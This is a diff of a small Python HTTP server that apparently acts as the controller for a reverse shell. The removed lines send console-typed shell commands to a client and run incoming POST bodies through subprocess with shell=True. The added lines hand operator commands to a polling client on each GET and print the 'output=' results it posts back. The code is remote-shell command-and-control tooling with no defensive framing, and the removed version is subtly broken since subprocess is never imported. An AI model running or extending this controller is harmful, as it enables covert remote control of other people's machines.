@@ -1,49 +1,32 @@
-import requests
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import unquote
 
-HOST_NAME = '127.0.0.1'  # Listen on all available interfaces
+HOST_NAME = '127.0.0.1'
 PORT_NUMBER = 80
-CLIENT_URL = 'http://127.0.0.1:8080'  # Update with the actual client URL
 
 class MyHandler(BaseHTTPRequestHandler):
 
-    def send_command_to_client(self, command):
-        try:
-            response = requests.post(url=CLIENT_URL, data=command.encode('utf-8'))
-            response.raise_for_status()
-            return response.text
-        except requests.exceptions.RequestException as e:
-            return f"Error sending command to client: {e}"
-
     def do_GET(self):
         self.send_response(200)
-        self.send_header("Content-type", "text/html")
+        self.send_header("Content-type", "text/plain")
         self.end_headers()
 
-        command = input("Shell> ")
-        output = self.send_command_to_client(command)
-
-        response_data = f"Command sent to client. Response:\n{output}"
-        self.wfile.write(response_data.encode())
+        user_input = input("Enter a command to send to the client: ")
+        self.wfile.write(user_input.encode())
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
-        command = post_data.decode('utf-8')
-        response = self.execute_command(command)
+        output_start = post_data.find(b'output=') + len(b'output=')
+        output = post_data[output_start:]
+        decoded_output = unquote(output.decode('utf-8'))
+        response_data = f"Output:\n{decoded_output}"
 
         self.send_response(200)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
-        self.wfile.write(response.encode())
-
-    def execute_command(self, command):
-        try:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            output, error = CMD.communicate()
-            return f"Output:\n{output.decode('utf-8')}\nError:\n{error.decode('utf-8')}"
-        except Exception as e:
-            return f"Exception: {str(e)}"
+        self.wfile.write(response_data.encode('utf-8'))  # Encode as bytes before writing
+        print(response_data)  # Print the response to the console
 
 if __name__ == '__main__':
     server_class = HTTPServer
